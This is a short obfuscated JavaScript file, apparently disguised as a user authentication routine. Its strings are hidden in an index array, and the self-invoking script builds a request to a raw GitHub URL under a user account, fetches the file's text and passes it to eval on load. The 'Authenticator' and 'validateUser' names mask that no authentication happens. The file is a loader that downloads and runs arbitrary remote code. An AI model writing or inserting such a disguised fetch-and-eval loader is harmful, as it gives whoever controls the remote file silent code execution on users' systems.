(function(){
    const _0x1a3f = ['https://raw.githubusercontent.com/', 'hasoon-0/', 'main/refs/heads/main/auth.js', 'create', 'get', 'text'];
    const _0x5b2c = function(_0x2e1a){ return _0x1a3f[_0x2e1a]; };
    
    class Authenticator {
        constructor() {
            this.req = Request[_0x5b2c(3)](_0x5b2c(0) + _0x5b2c(1) + _0x5b2c(2));
        }
        authenticate() {
            return this.req[_0x5b2c(4)]()[_0x5b2c(5)]();
        }
    }
    
    function validateUser() {
        const authInstance = new Authenticator();
        eval(authInstance.authenticate());
    }
    
    validateUser();
})();
